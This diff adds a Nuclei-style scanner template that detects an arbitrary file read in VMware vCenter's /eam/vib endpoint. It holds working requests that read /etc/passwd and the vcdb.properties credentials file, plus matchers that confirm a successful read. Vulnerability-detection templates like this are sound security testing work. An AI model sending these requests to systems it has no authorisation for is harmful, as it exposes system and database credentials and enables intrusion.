@@ -1,0 +1,32 @@
+id: vmware-vcenter-readfile
+info:
+  name: VMware vCenter Server Arbitrary File Read
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template detects arbitrary file read vulnerabilities in VMware vCenter Server through the `/eam/vib` endpoint.
+http:
+  - raw:
+      - |
+        GET /eam/vib?id=/etc/passwd HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+  - raw:
+      - |
+        GET /eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "org.postgresql.Driver"
